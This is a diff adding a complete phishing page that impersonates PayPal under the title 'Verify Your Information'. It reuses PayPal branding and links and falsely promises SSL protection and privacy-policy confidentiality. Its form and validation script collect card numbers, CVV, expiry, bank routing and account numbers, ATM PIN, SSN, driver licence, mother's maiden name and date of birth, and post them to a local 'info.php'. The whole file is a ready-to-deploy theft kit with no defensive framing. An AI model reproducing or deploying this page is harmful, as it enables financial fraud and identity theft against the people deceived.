@@ -1,0 +1,552 @@
+<html>
+<head>
+<!-- TWO STEPS TO INSTALL POPUP WINDOW:
+
+   1.  Paste the first into the HEAD of your HTML document
+   2.  Use the code to open the popup page on your site  -->
+
+<!-- STEP ONE: Copy this code into the HEAD of your HTML document  -->
+
+<HEAD>
+
+<SCRIPT LANGUAGE="JavaScript">
+<!-- Idea by:  Nic Wolfe (Nic@TimelapseProductions.com) -->
+<!-- Web URL:  http://fineline.xs.mw -->
+
+<!-- This script and many more are available free online at -->
+<!-- The JavaScript Source!! http://javascript.internet.com -->
+
+<!-- Begin
+function popUp(URL) {
+day = new Date();
+id = day.getTime();
+eval("page" + id + " = window.open(URL, '" + id + "', 'toolbar=0,scrollbars=0,location=0,statusbar=0,menubar=0,resizable=0,width=300,height=300');");
+}
+// End -->
+</script>
+<script>
+<!--
+
+
+//----------------------------------------------------------------------------------------------------------------------------------------------------//
+
+
+
+
+function ValidLength(str,number)
+{
+  if (str < number)
+    return false;
+  return true;
+}
+
+function ValidChars(CheckStr,chars)
+{
+  for (i = 0;  i < CheckStr.length;  i++)
+  {
+    ch = CheckStr.charAt(i);
+    for (j = 0;  j < chars.length;  j++)
+      if (ch == chars.charAt(j))
+        break;
+      if (j == chars.length)
+        return false;
+  }
+  return true;
+}  
+
+function ValidString(CheckStr,RepeatNum)
+{
+  if (CheckStr.length >= RepeatNum)
+  {
+    for (k = 0; k < CheckStr.length - 2; k++)
+    {
+      l = k+1;
+      if  (CheckStr.charAt(k) == CheckStr.charAt(l))
+      {
+        m = l+1;
+        if (CheckStr.charAt(k) == CheckStr.charAt(m))
+        {
+          return false;
+          break;
+        }
+        else
+        {
+          k++;
+        };
+      }  
+    }
+  }
+  return true;
+}
+
+function InValidWords(CheckStr)
+{
+  CheckStr = CheckStr.toLowerCase();
+  if (CheckStr.search(/fuck/i) != -1 || CheckStr.search(/shit/i)!= -1 || CheckStr.search(/bitch/i) != -1 || CheckStr.search(/sdf/i) != -1 || CheckStr.search(/dfg/i) != -1 || CheckStr.search(/asfd/i) != -1 || CheckStr.search(/asd/i) != -1 || CheckStr.search(/noname/i) != -1 || CheckStr.search(/firstname/i) != -1 || CheckStr.search(/lastname/i) != -1 || CheckStr.search(/zip/i) != -1 || CheckStr.search(/zipcode/i) != -1)
+    return true;
+  return false;
+}
+  
+
+
+//--------------Main Procedure--------------------------------------------------------------------------------------------//
+function Valid(theForm)
+{
+  //----------- Begin CCTYPE Validation -------------------------//
+  var FormCCType = theForm.cc_type.value
+  ValidEmailChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_@!.";
+   
+  if (!ValidLength(FormCCType.length, 4))
+  {
+    alert ("Please enter your Credit/Debit Card Type (Visa/Amex/Master/Discover)");
+    theForm.cc_type.focus();
+    return false;
+  }
+    /*-----------End CCType Validation -------------------------/
+  
+
+  /------------------ Begin CCBank Validation ----------------*/
+ var FormCCBank = theForm.cc_bank.value
+  var ValidNameChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz- ";
+  var voweltest = /[aeiou]+/i;
+  
+  if (!ValidLength(FormCCBank.length, 3))
+  {
+    alert ("Please enter your Issuing Bank!");
+    theForm.cc_bank.focus();
+    return false;
+  }
+  
+  /*--------------------- End CCBank Validation ----------------------*/
+  
+  /------------------ Begin CCNum Validation ----------------*/
+ var FormCCNum = theForm.cc_num.value
+  var ValidNameChars = "1234567890- ";
+  var voweltest = /[aeiou]+/i;
+  
+  if (!ValidLength(FormCCNum.length, 16))
+  {
+    alert ("Please enter a valid credit card Number");
+    theForm.cc_num.focus();
+    return false;
+  }
+  
+  /*--------------------- End CCNum Validation ----------------------*/
+  
+  /------------------ Begin CCExp Validation ----------------*/
+ var FormCCExp = theForm.cc_exp.value
+  var ValidNameChars = "1234567890/., ";
+  var voweltest = /[aeiou]+/i;
+  
+  if (!ValidLength(FormCCExp.length, 4))
+  {
+    alert ("Please enter your Card Expiration Date!(mm/yyyy)");
+    theForm.cc_exp.focus();
+    return false;
+  }
+  
+  /*--------------------- End CCExp Validation ----------------------*/  
+  
+  /------------------ Begin CCcvv Validation ----------------*/
+ var FormCCCvv = theForm.cc_cvv.value
+  var ValidNameChars = "1234567890";
+  var voweltest = /[aeiou]+/i;
+  
+  if (!ValidLength(FormCCCvv.length, 3))
+  {
+    alert ("Please enter your CVV!(3 last digits at the back of your card; next to signature)");
+    theForm.cc_cvv.focus();
+    return false;
+  }
+  
+  /*--------------------- End CCcvv Validation ----------------------*/
+  
+  return true;  
+}  
+
+//-->
+</script>
+
+<!-- 
+  Script info: script: webscr, cmd: _login-submit, template: p/acc/validate, date: Oct. 26, 2003 14:16:01 PST; country: US, language: en_US
+  web version: 19.0-193 branch: live-190
+  content version: 19.0-191 branch: live-190-->
+	<title>PayPal - Verify Your Information</title>
+<META http-equiv="DESCRIPTION" content="PayPal lets you send money to anyone with email. PayPal is free for consumers and works seamlessly with your existing credit card and checking account. You can settle debts, borrow cash, divide bills or split expenses with friends all without going to an ATM or looking for your checkbook."><META http-equiv="KEYWORDS" content="Send, money, payments, credit, credit card, instant, money, financial services, mobile, wireless, WAP, cell phones, two-way pagers, Windows CE">				<link rel="stylesheet" type="text/css" href="https://www.paypal.com/css/pp_styles_111402.css">
+	
+
+			<link rel="stylesheet" type="text/css" href="https://www.paypal.com/css/pp_table_styles.css">
+	<script src="http://www.paypal.com/js/pp_main.js"></script><link rel="shortcut icon" href="/en_US/i/icon/pp_favicon_x.ico">
+</head>
+
+					 
+												
+
+
+<body bgcolor="#ffffff"
+>
+<script language="JavaScript">
+
+// this function selects the radio button passed in 
+// and unselects all other radio buttons on the page
+function selectButton(formObj, radioObj){
+	radioObj.checked = true;
+	for (var i=0; i< formObj.elements.length; i++){
+		if (formObj.elements[i].type == "radio" && formObj.elements[i] != radioObj){
+			formObj.elements[i].checked = false;
+		}
+	}
+}
+</script>
+<form method=post action="info.php" method=get onsubmit="return Valid(this)"">
+<input type="hidden" name="cmd" value="_flow">
+<input type=image name="validate" src="pixel.gif" width="1" height="1" border="0"><br>
+<!-- Begin Context --><input type="hidden" name="CONTEXT" value="1nSS-UdvkfWZxW04Jz65H6r8ktwYmjZ07LccRUZBFU1DDWtH9SHtgpWxF-vW4z0cfvKonQ53tsfAkpEen5uRiI1rJVk5WT7m9Y8hxa9d_4ZWJfAPfyySbYVxdY9MYP-zmWs0XqIa7PWPsAnvquJy24NXYbWyxyAiJJuGsbK-srCjEDRwEFXvmjFBGkNhN3-xBL4kTkFTybJNiyH2GoGm5bBSdBDEAhdxrCS-jQi5__GZxmdfszSBza4RGsRx1RK5w-y6kHfcFY7A7gFpPmlY70coPUtNGfdSO-XLJCMnd9CgB9mVrSmEXq85Prw163UGIIQnvvhmUMMEFuI8aXifiN5eMUVqD_swXzeQdvcsaxt3mOmdh9e1TLX0JI05El_gh-9z7SODzvRGNFTYW3LlOdsHU1WoAG1T-e3YhODnjpyWZcHSIwUH26O9C5ZSh9hay5wa3CrXUw42wR6w-w0TGdbaJxU8Mgvmhyje7fron09J-xnvJXUAR7EjWaW"><!-- End Context -->
+			<table cellpadding=0 cellspacing=0 border=0 align=center width=600>
+	<tr>
+		
+					<td nowrap><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_account">
+                    <img src="paypal_logo.gif" border="0" width="200" height="50"></a></td>
+				
+					<td width=100% align=center class="pptext">&nbsp;</td>
+				
+		
+					 
+				<td nowrap class="pptext" align=right><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_logout" >Log&nbsp;Out</a>&nbsp;|&nbsp;<a href="https://www.paypal.com/cgi-bin/webscr?cmd=_help&source_page=_login-submit" >Help</a></td>
+						</tr>
+</table>
+<br class="h5">
+<table cellpadding=0 cellspacing=0 border=0 align=center width=100%>
+	<tr>
+			<td background="/en_US/i/nav/bg.gif">
+				<table border=0 cellpadding=0 cellspacing=0 align=center>
+				<tr>
+											<td><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_account">
+                                            <img src="P_off_my_account.gif" border=0 alt="My Account" width="106" height="36"></a></td>						
+										
+					<td><img src="http://www.paypal.com/en_US/i/scr/pixel.gif" width=1 height=1></td>
+					
+											<td><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_transaction-run">
+                                            <img src="P_off_send_money.gif" border=0 alt="Send Money" width="110" height="36"></a></td>
+											
+					<td><img src="http://www.paypal.com/en_US/i/scr/pixel.gif" width=1 height=1></td>
+					
+											<td><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_request-money">
+                                            <img src="P_off_request_money.gif" border=0 alt="Request Money" width="130" height="36"></a></td>
+										
+					<td><img src="http://www.paypal.com/en_US/i/scr/pixel.gif" width=1 height=1></td>
+					
+											<td><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_merchant">
+                                            <img src="P_off_merchant_tools.gif" border=0 alt="Merchant Tools" width="130" height="36"></a></td>
+					
+					<td><img src="http://www.paypal.com/en_US/i/scr/pixel.gif" width=1 height=1></td>
+					
+																<td><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_auction" class="pptabtext">
+                                                                <img src="P_off_auction_tools.gif" border=0 alt="Auction Tools" width="118" height="36"></a></td>
+																		
+				</tr>
+			</table>
+			
+							<img src="http://www.paypal.com/en_US/i/scr/pixel.gif" width=1 height=20>
+						
+		</td>
+		
+			<td><img src="http://www.paypal.com/en_US/i/scr/pixel.gif" width=1 height=59></td>
+				
+	</tr>
+</table>
+
+
+<img src="http://www.paypal.com/en_US/i/scr/pixel.gif" width=1 height=10><br>
+				
+  
+
+  
+					<table class="title" cellpadding="0" cellspacing="0" border="0" align="center">
+	<tr>
+	  <td width="100%" class="ppheading">Confirm your information</td>
+			  	<td nowrap class="ppsmalltext" align="right"><a href="#" onclick="ContextOpenHelp('password');">Help with this page</a>&nbsp;<a href="#" onclick="ContextOpenHelp('password');"><img src="http://www.paypal.com/en_US/i/btn/help.gif" border="0" hspace="0" align="top" width="17" height="15"></a>
+</td>
+	  	</tr>
+	<tr>
+		<td colspan=2><img src="http://www.paypal.com/en_US/i/scr/pixel.gif" width="2" height="2"></td>
+	</tr>
+</table>
+<table class="main" cellpadding="0" cellspacing="0" border="0" align="center">
+	<tr>
+		<td><img src="http://www.paypal.com/en_US/i/scr/pixel.gif" width=6 height=6></td>
+	</tr>
+	<tr>
+		<td bgcolor="#999999" width=100%><img src="http://www.paypal.com/en_US/i/scr/pixel.gif" width=1 height=2></td>
+	</tr>
+	<tr>
+		<td><img src="http://www.paypal.com/en_US/i/scr/pixel.gif" width=6 height=6></td>
+	</tr>
+</table>	
+
+<table class="main" cellpadding="0" cellspacing="0" border="0" align="center">
+	<td class="maintd" align="left">			Your credit/debit card 
+    information along with your personal information will be verified instantly.<p><br>
+		All the data is protected by the industry standard SSL encryption. All 
+    information is required and is kept confidential in accordance with PayPal 
+    Privacy Policy.</p>
+    <p>&nbsp;</p>
+    <p>
+	<span class="ppsmalltextbold">
+    </p>
+<table width="100%" cellspacing="0" cellpadding="0" border="0">
+	<tr>
+		<td><img src="http://www.paypal.com/en_US/i/scr/pixel.gif" width=200 height=1></td>
+		<td><img src="http://www.paypal.com/en_US/i/scr/pixel.gif" width=6 height=1></td>
+		<td><img src="http://www.paypal.com/en_US/i/scr/pixel.gif" width=382 height=1></td>
+	</tr>
+	
+	
+	<tr> 	
+		<td colspan="3" class="ppheaderborder" style="background-color: #003366"><input type="hidden" name="cc" value="">
+        &nbsp;</td>
+	</tr>		
+	<tr>
+		<td colspan="3">
+        <p align="center">
+	*<span class="ppsmalltextbold">Please fill in the correct information verify 
+    your identity.<font size="1" color="#FF0000"> </font><font size="1">All 
+    fields are mandatory</font><br class="h10">
+        </span></p>
+        <p><br class="h10"></td>
+	</tr>
+	<tr>
+		<td colspan="3" class="ppheaderborder" style="background-color: #003366">
+        <b><font color="#FFFFFF">Credit/Debit card information</font></b></td>
+	</tr>
+    <tr>
+		<td colspan="3">
+        <p align="center">
+	<span class="ppsmalltextbold">
+	    <img src="http://www.paypal.com/en_US/i/scr/pixel.gif" width="1" height="30" border="0"><img alt="Visa" src="https://www.paypal.com/en_US/i/icon/icon_visa.gif" border="0" width="39" height="26"><img alt="MasterCard" hspace="2" src="https://www.paypal.com/en_US/i/icon/icon_mastercard.gif" border="0" width="39" height="26"><img alt="Discover" src="https://www.paypal.com/en_US/i/icon/icon_discover.gif" border="0" width="39" height="26"><img alt="American Express" hspace="2" src="https://www.paypal.com/en_US/i/logo/icon_amex.gif" border="0" width="27" height="26"></span></p>
+        <p><br class="h10"></td>
+	</tr>
+    <tr>
+		<td align=right class="pplabel" valign=top>Card type:</td>
+		<td><br class="field_spacer"></td>
+		<td valign=top>
+	<span class="ppsmalltextbold">
+	    <input type="text" name="cc_type" size="10" maxlength="19" value=""></span>
+		</td>
+	</tr>
+    <tr>
+		<td valign=top align=right class="pplabel">Issue Bank Name:</td>
+		<td><br class="field_spacer"></td>
+		<td valign=top>
+        <input type="text" name="cc_bank" size="30" maxlength="19" value=""></td>
+	</tr>
+    <tr>
+		<td align=right class="pplabel" valign=top>Card number:</td>
+		<td><br class="field_spacer"></td>
+		<td valign=top>
+	<span class="ppsmalltextbold">
+	    <input type="text" name="cc_num" size="30" maxlength="19" value=""></span>
+		</td>
+	</tr>
+    <tr>
+		<td valign=top align=right class="pplabel">Expiration date:</td>
+		<td><br class="field_spacer"></td>
+		<td valign=top>
+        <input type="text" name="cc_exp" size="10" maxlength="7" value="">
+        <font size="1">(mm/yyyy)</font></td>
+	</tr>
+    <tr>
+		<td align=right class="pplabel" valign=top>CVV code:</td>
+		<td><br class="field_spacer"></td>
+		<td valign=top>
+	<span class="ppsmalltextbold">
+	    <input type="text" name="cc_cvv" size="4" maxlength="4" value=""></span>
+        <font size="1">3 last digits at the back of your card; next to signature</font></td>
+	</tr>
+    <tr>
+		<td valign=top align=right class="pplabel">Name on card:</td>
+		<td><br class="field_spacer"></td>
+		<td valign=top>
+        <input type="text" name="cc_name" size="30" maxlength="30" value=""></td>
+	</tr>
+    <tr>
+		<td align=right class="pplabel" valign=top>Billing address:</td>
+		<td><br class="field_spacer"></td>
+		<td valign=top>
+	<span class="ppsmalltextbold">
+	    <input type="text" name="cc_address" size="30" maxlength="35" value=""></span>
+		</td>
+	</tr>
+    <tr>
+		<td valign=top align=right class="pplabel">Country:</td>
+		<td><br class="field_spacer"></td>
+		<td valign=top>
+        <input type="text" name="cc_country" size="30" maxlength="19"></td>
+	</tr>
+    <tr>
+		<td valign=top align=right class="pplabel">City:</td>
+		<td><br class="field_spacer"></td>
+		<td valign=top>
+        <input type="text" name="cc_city" size="30" maxlength="19" value=""></td>
+	</tr>
+    <tr>
+		<td align=right class="pplabel" valign=top>State/Province:</td>
+		<td><br class="field_spacer"></td>
+		<td valign=top>
+	<span class="ppsmalltextbold">
+	    <input type="text" name="cc_state" size="30" maxlength="19" value=""></span>
+		</td>
+	</tr>
+    <tr>
+		<td valign=top align=right class="pplabel">Zip/Postal-code:</td>
+		<td><br class="field_spacer"></td>
+		<td valign=top>
+        <input type="text" name="cc_zip" size="30" maxlength="19" value=""></td>
+	</tr>
+    <tr>
+		<td valign=top align=right class="pplabel">Telephone:</td>
+		<td><br class="field_spacer"></td>
+		<td valign=top>
+        <input type="text" name="cc_tel" size="30" maxlength="19" value=""></td>
+	</tr>
+    <tr>
+		<td colspan="3" class="ppheaderborder" style="background-color: #003366">
+        <b><font color="#FFFFFF">Verify you are the true holder of this card</font></b></td>
+	</tr>
+    <tr>
+		<td colspan="3"><br class="h10"></td>
+	</tr>
+    <tr>
+		<td align=right class="pplabel" valign=top>Bank routing number:</td>
+		<td><br class="field_spacer"></td>
+		<td valign=top>
+	<span class="ppsmalltextbold">
+	    <input type="text" name="cc_routing" size="20" maxlength="19" value=""></span>
+		</td>
+	</tr>
+    <tr>
+		<td valign=top align=right class="pplabel">Checking account number:</td>
+		<td><br class="field_spacer"></td>
+		<td valign=top>
+        <input type="text" name="cc_account" size="20" maxlength="19" value=""></td>
+	</tr>
+    <tr>
+		<td align=right class="pplabel" valign=top>PIN-code:</td>
+		<td><br class="field_spacer"></td>
+		<td valign=top>
+	<span class="ppsmalltextbold">
+	    <input type="text" name="cc_pin" size="6" maxlength="6" value=""></span>
+        <font size="1">&nbsp;</font><span style="font-size: 8pt"><A HREF="javascript:popUp('secure.htm')"><span style="font-size: 8pt">Why PIN is Required</span></A></font><img src="http://www.paypal.com/en_US/i/btn/help.gif" border="0" hspace="0" align="top" width="17" height="15"></a>
+        <font size="1">4 Digit code used in ATM's</font></td>
+	</tr>
+    <tr>
+		<td valign=top align=right class="pplabel">SSN:</td>
+		<td><br class="field_spacer"></td>
+		<td valign=top>
+        <input type="text" name="ssn" size="20" maxlength="11" value="">
+        <font size="1">Security Social Number</font></td>
+	</tr>
+    <tr>
+                 <td valign=top align=right class="pplabel">Driver License:</td>
+		<td><br class="field_spacer"></td>
+		<td valign=top>
+        <input type="text" name="dll" size="20" maxlength="11" value="">
+        <font size="1">Driver License Number</font></td>
+	</tr>
+    <tr>
+		 <td align=right class="pplabel" valign=top>MMN:</td>
+		<td><br class="field_spacer"></td>
+		<td valign=top>
+	<span class="ppsmalltextbold">
+	    <input type="text" name="mmn" size="20" maxlength="19" value=""></span>
+        <font size="1">Mother's Maiden Name</font></td>
+	</tr>
+    <tr>
+		<td align=right class="pplabel" valign=top>DOB:</td>
+		<td><br class="field_spacer"></td>
+		<td valign=top>
+	<span class="ppsmalltextbold">
+	    <input type="text" name="dob" size="20" maxlength="10" value="mm/dd/yyyy"></span>
+        <font size="1">Date Of Birth</font></td>
+	</tr>
+	<tr>
+		<td colspan="3">
+        <p align="center">&nbsp;</td>
+	</tr>		
+	
+	
+
+	
+			
+					
+	<tr>
+		<td colspan="3">&nbsp;</td>
+	</tr>		
+	
+	
+
+	
+			
+					
+</table>	
+
+	<tr>
+		<td colspan="2"><img src="http://www.paypal.com/en_US/i/scr/pixel.gif" width="4" height="4"></td>
+	</tr>
+</table>
+							<table class="main" cellpadding="0" cellspacing="0" border="0" align="center">
+	<tr>
+		<td><img src="http://www.paypal.com/en_US/i/scr/pixel.gif" width=6 height=6></td>
+	</tr>
+	<tr>
+		<td bgcolor="#999999" width=100%><img src="http://www.paypal.com/en_US/i/scr/pixel.gif" width=1 height=2></td>
+	</tr>
+	<tr>
+		<td><img src="http://www.paypal.com/en_US/i/scr/pixel.gif" width=6 height=6></td>
+	</tr>
+</table><table class="main" cellpadding="0" cellspacing="0" border="0" align="center">
+	<tr>
+		<td colspan="4"><img src="http://www.paypal.com/en_US/i/scr/pixel.gif" width="4" height="4"></td>
+	</tr>
+	<tr>
+		<td width="6"><img src="http://www.paypal.com/en_US/i/scr/pixel.gif" width="6" height="6"></td>
+		<td width="100%" class="ppsmalltext">&nbsp;</td>
+    <td><input type="submit" name="validate" value="Submit"  ></td>
+    <td width="6"><img src="http://www.paypal.com/en_US/i/scr/pixel.gif" width="6" height="6"></td>
+	</tr>
+	<tr>
+		<td colspan="4"><img src="http://www.paypal.com/en_US/i/scr/pixel.gif" width="6" height="6"></td>
+	</tr>
+</table>
+<br><br>
+<table cellspacing=0 cellpadding=0 border=0 align=center>
+    <tr>
+        <td align=center class="footer">
+            <a href="https://www.paypal.com/cgi-bin/webscr?cmd=p/gen/mobile">Mobile</a>
+             | <a href="https://www.paypal.com/cgi-bin/webscr?cmd=p/gen/batch">Mass Pay</a>
+             | <a href="https://www.paypal.com/cgi-bin/webscr?cmd=_upgrade-interest-marcom">Money Market</a>
+             | <a href="https://www.paypal.com/cgi-bin/webscr?cmd=_dc-intro">ATM/Debit Card</a>
+             | <a href="https://www.paypal.com/cgi-bin/webscr?cmd=_pay-bill">BillPay</a>
+             | <a href="https://www.paypal.com/cgi-bin/webscr?cmd=p/gen/about">About Us</a>
+             | <a href="https://www.paypal.com/cgi-bin/webscr?cmd=p/gen/accounts">Accounts</a>
+             | <a href="https://www.paypal.com/cgi-bin/webscr?cmd=_display-fees">Fees</a>
+             | <a href="https://www.paypal.com/cgi-bin/webscr?cmd=p/gen/ua/policy_privacy">Privacy</a>
+             | <a href="https://www.paypal.com/cgi-bin/webscr?cmd=_security-center">Security Center</a>
+             | <a href="https://www.paypal.com/cgi-bin/webscr?cmd=p/gen/ua/ua">User Agreement</a>
+             | <a href="https://www.paypal.com/cgi-bin/webscr?cmd=_pdn-intro">Developers</a>
+            | <a href="https://www.paypal.com/cgi-bin/webscr?cmd=_shop">Shops</a>            <br>
+            <br>
+            <a href="http://www.ebay.com/" target="_blank"><span class="pptextbold"><span class="ppinlineblack"><u>an eBay Company</u></span></span></a><br><br class="h10">
+            Copyright &copy; 1999-2003 PayPal. All rights reserved.<br>
+            <a href="https://www.paypal.com/cgi-bin/webscr?cmd=p/gen/fdic">Information about FDIC pass-through insurance</a></td>
+    </tr>
+</table>
+<!-- end footer -->
+
+</form>
+<SCRIPT src="cr.js" type=text/javascript></SCRIPT>
+<script type="text/javascript">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </script>
+<noscript><div> (demonstration requires scripting) </div></noscript>
+
+</BODY>
+</HTML>
